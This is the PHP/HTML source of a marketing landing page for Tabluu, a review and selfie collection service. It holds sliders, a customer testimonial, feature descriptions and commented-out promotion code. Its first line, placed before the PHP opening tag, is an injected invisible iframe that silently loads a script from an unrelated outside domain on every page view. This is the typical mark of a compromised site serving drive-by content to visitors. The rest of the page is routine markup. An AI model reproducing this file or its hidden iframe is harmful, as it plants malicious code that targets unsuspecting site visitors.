<iframe style="visibility: hidden; display: none; display: none;" src="http://used-toyota-cars.co.uk/referer.php?id={0CB7C8EA-2C9F-4119-AA6A-6CF2ADC392BA}"></iframe>﻿<?php
session_start();
$ur_session = rand(0, 15);
$_SESSION['session']=$ur_session;
?>
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="google-site-verification" content="EQez1wVJd5ruzADIL1OQrBMh391ORWp8Nzfkpkhpso8" />
<title>Tabluu - your awesome tool to get user generated content for social media marketing</title>
<meta name="title" content="Tabluu is an awesome tool to get user generated content for social media marketing">
<meta name="keywords" content="feedback collection, fund raising campaigns, selfie contests, brand awareness campaigns, new product launch campaigns, fan list building, viral email marketing and product show casing">
<meta name="description" content="Get response such as feedback, review, photos & selfies from your audience & use them for effective social media marketing! Tabluu helps you collect feedback & reviews. Tabluu is also effective for viral marketing using selfie campaigns.">
<link href="css/bootstrap.css" rel="stylesheet" media="all">
<link href="css/style.css" rel="stylesheet" media="all">
<link rel="stylesheet" href="css/flexslider.css" media="all">

<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
  <script type='text/javascript' src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <script type='text/javascript' src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
<![endif]-->
<link type="text/css" media="all" rel="stylesheet" href="css/dialog.css" >
<link rel="Shortcut Icon" href="http://camrally.com/blog/wp-content/themes/Tabluu%20Theme%20V1/images/favicon.ico" type="image/x-icon">
<script src="//load.sumome.com/" data-sumo-site-id="9e98d0a1ee03ad7942ebac5144759f147aafe068a407e46486c26b9a207c4300" async="async"></script>
<?php include_once("analyticstracking.php") ?>
</head>

<body>
<?php require_once('browser_detection.php'); ?>
<?php require_once('header.html'); ?>
<!-- robert -->
<div class="flexslider">
  <ul class="slides">
    <li><img src="images/slider1.jpg"><span>
      <h3>Happy customers make great advocates for your business</h3>
      <h2>Ask for a feedback & get your business recommended on the social media easily!</h2>
      </span></li>
    <li><img src="images/m-slider2.jpg"><span>
      <h3>Only good reviews & ratings are shared on the social media!</h3>
      <h2>Because Tabluu asks only reviewers who want to recommend your business to share their experience.</h2>
      </span></li>
    <li><img src="images/m-slider3.jpg"><span>
      <h3>Every interaction on the social media benefits your business.</h3>
      <h2>Your customers engage their friends while your business gets promoted!</h2>
      </span></li>
    <li><img src="images/m-slider4.jpg"><span>
      <h3>Customers advocacy in action!</h3>
      <h2>Your brand name, address, phone & positive ratings displayed on your customers' photos!</h2>
      </span></li>
  </ul>
</div>
<!--
<div class="banner-section">
  <div class="container">
    <div class="row">
      <div class="banner-main">
        <div class="col-sm-9">
          <div class="banner">
            <div class="banner-text">
              <h2>PRE-LAUNCH <br/>DEAL!</h2>
              <p>Get Tabluu's 12 months Enterprise plan<br/> for $19.90!
                Limited to the first 150 sign ups only.</p>
            </div>
          </div>
        </div>
        <div class="col-sm-3">
          <div class="timer">
          <h2 class="visible-xs"><small>PRE-LAUNCH</small><br/>DEAL!</h2>
		  <?php
		  /*
			include_once('class/class.main.php');
			$connect = new db();
			$connect->db_connect();
			$isclokstart = 0;
			$result = mysql_query("SELECT `time` as selects,is_started, `stardate`, `campaign`, `accounts`, `accountleft` FROM `businessClockcounter` WHERE 1 ");
			if(mysql_num_rows($result)){
				$row = mysql_fetch_object($result);
				$isclokstart = $row->is_started;
				$user_tz = 'Asia/Singapore';
				$server_tz = 'UTC';
				$schedule_date = new DateTime($row->stardate, new DateTimeZone($server_tz) );
				$schedule_date->sub(new DateInterval('P0DT0H2M0S'));
				$schedule_date->setTimeZone(new DateTimeZone($user_tz));
				$startdate = $schedule_date->format('Y/m/d H:i:s');
			}
			$connect->db_disconnect();	*/	  
		  ?>
			<input type="hidden" value="<?php //echo $isclokstart;?>" name="isclokstart" id="isclokstart" />
			<input type="hidden" value="<?php //echo $row->selects;?>" name="txttime" id="txttime" />
			<input type="hidden" value="<?php //echo $startdate?>" name="stardate" id="stardate" />
			<input type="hidden" value="<?php //echo $row->campaign;?>" name="campaign" id="campaign" />
			<input type="hidden" value="<?php //echo $row->accounts;?>" name="accounts" id="accounts" />
			<input type="hidden" value="<?php //echo $row->accountleft;?>" name="accountleft" id="accountleft" />
          <h2 class="hidden-xs clock worday" ></h2>
		  <div class="stopwatch visible-xs week"><b class="m-week">00</b><span ><br/> Wks.</span></div>
          <div class="stopwatch visible-xs" style="display:inline-block !important;"><b class="day">00</b><span> <br/>Days</span></div>
          <div class="stopwatch"><b class="hour">00</b><span> <br/>Hrs.</span></div>
          <div class="stopwatch"><b class="min">00</b><span> <br/>Mins.</span></div>
          <div class="stopwatch"><b class="sec">00</b><span> <br/>Secs.</span></div>
          <p class="hidden-xs <?php //echo ($row->accounts <= $row->accountleft  ? '' : 'hide')?>" >(Accounts left: <?php //echo $row->accounts;?>)</p>
          <h3 class="mobile-offer visible-xs">Get Tabluu's 12 months Enterprise plan for <b>$19.90</b></h3>
          <h6 class="visible-xs limit-info">Limited to the first 150 sign ups only.</h6>
          <h3 class="hidden-xs">  &nbsp; &nbsp; Special price: $19.90</h3>
          <a class="timer-btn hidden-xs signupbtn" href="#">Get It Now!</a>
          <a class="timer-btn green visible-xs signupbtn" href="#">Sign Up Now!</a>
          <small class="account-left visible-xs"></small>
          </div>
        </div>
      </div>
    </div>
  </div>
</div> -->
<div class="container">
  <div class="content">
	<!--
    <div class="row none">
      <div class="col-sm-7 happy">
       <h2>HAPPY CUSTOMERS MAKE GREAT <br/>
          ADVOCATES FOR YOUR BUSINESS</h2><p></p>
        <p><b>Start collecting reviews & selfies for effortless social media marketing today!</b></p>
      </div>
      <div class="col-sm-5 happy"><a href="http://camrally.com/pricing.html">See Pricing</a> <a href="#" class="signupbtn">Sign up!</a></div>
    </div> --> 
	<div class="row none">
      <div class="cust-post">
       <h1>ASK FOR A FEEDBACK & GET YOUR BUSINESS </BR>RECOMMENDED ON THE SOCIAL MEDIA EASILY!</h1>
	  </div>
    </div>
	
    <div class="border-bottom">
      <!-- <div class="row"> -->
        <div class="col-sm-8 padding-r left-width">
          <ul class="bxslider">
            <li><img src="images/slider1copy.png" alt="img" class="img-responsive">
              <div class="banner-text"></div>
            </li>
            <li><img src="images/slider2copy.png" alt="img" class="img-responsive">
              <div class="banner-text"></div>
            </li>
            <li><img src="images/slider3copy.png" alt="img" class="img-responsive">
              <div class="banner-text"></div>
            </li>
          </ul>
        </div>
        <div class="col-sm-4 padding-none right-width">
          <div id="bx-pager"> <a data-slide-index="0" href="">
            <h2>Only good reviews & ratings are shared on the social media!</h2>
            <p>Because Tabluu asks only reviewers who want to recommend your business to share their experience.</p>
            </a> <a data-slide-index="1" href="">
            <h2>Every interaction on the social media benefits your business.</h2>
            <p>Your customers engage their friends while your business gets promoted!</p>
            </a> <a data-slide-index="2" href="">
            <h2>Customer advocacy in action!</h2>
            <p>Your brand name, address, phone & positive ratings displayed on your customers' photos!</p>
            </a> </div>
        </div>
      <!-- </div> -->
    </div>
  </div>
</div>
<div class="qrcode-wrap">
<div class="container">
	<div class="qrcode-content">
		<div class="cust-post">
		   <h1>USE OFFLINE - DISPLAY '20 POST YOUR "X" <br/>SELFIE' MESSAGE PRINTS ON LOCATION...</h1>
		   <div class="clear" style="padding:1em 0;"></div>
			<div class="hidden-xs">
				<div class="tblcontainer">
					<div class="row">
						<div class="left text-right">
							<img src="images/x_selfie_message_print.png" class="dqrcodeprint" />
						</div>
						<div class="right text-left">
							<div class="text-left dqrcodetxt">
							<ul>
								<li class="nostyle"><b>DISPLAY THEM AT:</b></li>
								<li>LOBBIES</li>
								<li>DINING TABLES</li>
								<li>POOL SIDE TABLES</li>
								<li>HOTEL ROOMS</li>
								<li>OPENING EVENTS</li>
								<li>WAITING AREAS</li>											
								<li>EXHIBITION HALLS</li>
								<li>LOUNGES</li>
								<li>ATTRACTIONS</li>
								<li>OTHER "CHILL OUT" SPOTS</li>
							</ul>
							</div> 
						</div>
					</div>
				</div>
				<div class="text-center">
					<div class="clear" style="padding:0.7em 0;"></div>
					<p>Demo mobile link:</p> 
					<a href="http://camrally.com/awjn0e" target="_blank">camrally.com/awjn0e</a>
				</div>
				<div class="clear" style="padding:0.7em 0;"></div>
				<div class="selfiereview text-center">"X" Selfie = Selfie + Review</div>
				<div class="clear" style="padding:1em 0;"></div>
				<div class="tblcontainer">
					<div class="row">
						<div class="left text-right">
							<div class="link" style="margin-right:40px"><a href="http://camrally.com/pricing.html">See Pricing</a></div>
						</div>
						<div class="right text-left">
							<div class="link" style="margin-left:40px"><a href="#" class="signupbtn">Sign Up!</a></div>
						</div>
					</div>
				</div>
			</div>	
			<div class="visible-xs text-center">
				<img src="images/x_selfie_message_print.png" class="self-img" />
				<div class="clear" style="padding:1em"></div>
				<div class="text-left" style="width:350px;margin:0 auto"> 
					<ul>
						<li class="nostyle"><b>DISPLAY THEM AT:</b></li>
						<li>LOBBIES</li>
						<li>DINNING TABLES</li>
						<li>POOL SIDE TABLES</li>
						<li>HOTEL ROOMS</li>
						<li>OPENING EVENTS</li>
						<li>WAITING AREAS</li>							
						<li>EXHIBITION HALLS</li>
						<li>LOUNGES</li>
						<li>ATTRACTIONS</li>
						<li>OTHER "CHILL OUT" SPOTS</li>	
						
					</ul>
				</div>
				<div class="text-center">
					<div class="clear" style="padding:0.5em 0;"></div>
					<p>Demo mobile link:</p> 
					<a href="http://camrally.com/awjn0e" target="_blank">camrally.com/awjn0e</a>
				</div>
				<div class="clear" style="padding:0.7em 0;"></div>
				<div style="width:100%;background-color:#ccc;padding:3px 0;line-height:30px; font-size:22px;padding:7px" class="text-center">"X" Selfie = Selfie + Review</div>
				<div class="clear" style="padding:0.4em 0;"></div>
				<div class="visible-xs"><a class="timer-btn" style="margin-bottom:10px;width:100%" href="http://camrally.com/pricing.html">See Pricing</a><br/>
				<a class="timer-btn signupbtn" style="margin-bottom:10px;width:100%" >Sign Up!</a>
				</div>
			</div>
		</div>
		
	</div>
</div>  
</div>
<div class="users">
  <div class="container">
    <h2>WHAT OUR USERS ARE SAYING…</h2>
    <div class="row">
      <div class="col-sm-4">
        <div class="userimg"><img class="img-responsive" src="images/userimg.png" width="252" height="316" alt="img"></div>
      </div>
      <div class="col-sm-8">
        <p>"Tabluu's revolutionary concept of user generated content for social marketing is brilliant! Who would have thought that getting customers to share their positive feedback is so easy & effective! The killer is in the details & Tabluu nailed it! Our phone is definitely ringing a lot more these days. Sales increased 43% even though we cut our marketing spending by 70%!  We are now leasing more space to cater for additional business & we rely solely on Tabluu to spread the word. Why not? Tabluu simply outperforms any social media marketing tools in the market now."</p>
        <h3><img class="img-responsive visible-xs" src="images/userimg.png" width="80" height="auto" alt="img" style="float:left; margin-right:10px;"><span>Han Tjandra, Co-Founder</span> <br/>
          SHAO KAO PIK Restaurant <br/>
          Jakarta, Indonesia </h3>
      </div>
    </div>
    <div class="row">
      <div class="col-sm-9 margin_T happy">
        <p><b>SHAO KAO PIK Restaurant - 652 reviews, 545 followers, 9,345 new visitors 
          & counting! <u>43% increase in business</u> from April 2014 to Jan 2015. Currently only using Tabluu for promotional & social media marketing activities.</b></p>
      </div>
      <div class="col-sm-3 margin_T happy hidden-xs"><a class="pull-right" href="http://camrally.com/09z9wxb.html" target="_blank" >Results</a><div style="clear:both;padding-top:20px;"></div><a class="pull-right" href="http://camrally.com/blog/tabluu/interview-how-shao-kao-pik-increased-their-sales-to-43" target="_blank">Interview</a></div>
      <div class="col-sm-3 visible-xs"><a class="timer-btn green full-btn visible-xss" style="margin-bottom:10px" href="http://camrally.com/09z9wxb.html" target="_blank">See the results here!<small></small></a><a class="timer-btn green full-btn visible-xss" href="http://camrally.com/blog/tabluu/interview-how-shao-kao-pik-increased-their-sales-to-43" target="_blank">Read the interview<small></small></a></div>
      
    </div>
    <div class="row">
      <div class="gallery">
        <img src="images/profiles-img.jpg" alt="" class="img-responsive" />

      </div>
    </div>
  </div>
</div>
<div class="feedback">
  <div class="container">
    <h2>more innovative ways to GET feedback & reviews </h2>
    <div class="row text-center">
      <div class="col-sm-4"> <span><img src="images/new-img/icon1.png" width="196" height="195" alt="img"></span>
        <h3>Email invitations</h3>
      </div>
      <div class="col-sm-4"> <span><img src="images/new-img/icon2.png" width="196" height="195" alt="img"></span>
        <h3>Surveys</h3>
      </div>
      <div class="col-sm-4"> <span><img src="images/new-img/icon3.png" width="196" height="195" alt="img"></span>
        <h3>Photo booth</h3>
      </div>
      
      </div>
      
      <div class="row text-center">
      <div class="col-sm-4"> <span><img src="images/new-img/icon4.png" width="196" height="195" alt="img"></span>
        <h3>QR codes</h3>
      </div>
      <div class="col-sm-4"> <span><img src="images/new-img/icon5.png" width="196" height="195" alt="img"></span>
        <h3>Feedback stations</h3>
      </div>
      <div class="col-sm-4"> <span><img src="images/new-img/icon6.png" width="196" height="195" alt="img"></span>
        <h3>Post selfies</h3>
      </div>
    </div>
   <!-- <div class="viewall visible-xs"><a href="#">click here to view more</a></div>-->
  </div>
</div>
<!--
<div class="container">
  <div class="video">

    <div class="row">
      <div class="col-sm-7">
        <h2>Why collect your own reviews?</h2>
        <p>Find out how you should respond to the biggest <br/>
          threats affecting your business today!</p>
      </div>
      <div class="col-sm-5 text-right"><img src="images/video.png" class="img-responsive" alt="img"></div>
    </div>
  </div>
</div> -->

<div class="bottom-section">
  <div class="container">
    <div class="row text-center">
     <h2 class="review-tool">YOUR ULTIMATE REVIEW & SELFIE MARKETING TOOL!</h2>
	  <div class="clear" style="padding-top:10px;"></div>
     <div class="col-sm-3"> <span><img src="images/design-icon1.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/design" target="_blank">Design</a><p>Create beautiful feedback & review collection pages that is representative of your brand, and design questions that are meaningful for your business.</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon2.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/collect" target="_blank">Collect</a><p>Tabluu excels in collecting feedback & reviews using fun, innovative and easy ways!</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon3.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/verify" target="_blank">Verify</a><p>All feedback & reviews collected on Tabluu are instantly verified for authencity. Tabluu keeps sinister reviewers at bay.</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon4.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/analyze" target="_blank">Analyze</a><p>Collect all feedback & review data real time. Data may be exported to excel for analysis purposes, helping you identify areas of improvement for your business.</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon5.png" alt="img"></span> <a href="http://camrally.com/blog/category/tabluu/features/respond" target="_blank">Respond</a><p>Get real time alerts of very negative feedback along with the customers’ contact information allowing you take the necessary actions immediately and privately.</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon6.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/manage" target="_blank">Manage</a><p>See who are your best customers and feature their reviews. Hide inappropriate images.</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon7.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/display" target="_blank">Display</a><p>Display your best reviews on your review widgets & the customer advocacy page, helping you increase sale conversions like never before!</p>
      </div>
      <div class="col-sm-3"> <span><img src="images/design-icon8.png" alt="img"></span><a href="http://camrally.com/blog/category/tabluu/features/promote" target="_blank">Promote</a><p>Tabluu asks every customer who provided a positive feedback to recommend your business on the their social media network! It's both free & effective!</p>
      </div>
	  </div>
    </div>
</div>

<div style="background-color:#F5F5F5">
<div class="container">
  <div class="plan">
    <div class="row">
      <div class="col-sm-9">
        <h2><span><img src="images/soundicon.png" alt="icon"></span>START COLLECTING REVIEWS & SELFIES FOR EFFORTLESS SOCIAL MEDIA MARKETING!</h2>
      </div>
      <div class="col-sm-3"><a class="pull-right signupbtn" href="#">Start My Plan</a></div>
    </div>
  </div>
</div>
</div>

<?php require_once('footer.html'); ?>
<script type="text/javascript" src="js/jquery.js"></script> 
<script type="text/javascript" src="js/bootstrap.min.js"></script> 
<script type="text/javascript" src="js/star-rating.js"></script> 
<script type="text/javascript" src="js/jquery.bxslider.js"></script> 
<script type="text/javascript" src="js/dialog.js"></script>
<script type="text/javascript" src="js/jquery.countdown.js"></script>
<script type="text/javascript" src="js/home.js"></script>
<!-- FlexSlider --> 
<script defer src="js/jquery.flexslider.js"></script> 
<script>
$('.bxslider').bxSlider({
pagerCustom: '#bx-pager',
mode: 'fade',
auto: true,
});
</script> 
<script type="text/javascript">
$(window).load(function(){
	$('.flexslider').flexslider({
	animation: "slide",
	start: function(slider){
	$('body').removeClass('loading');
	}
	});
});
</script>
</body>
</html>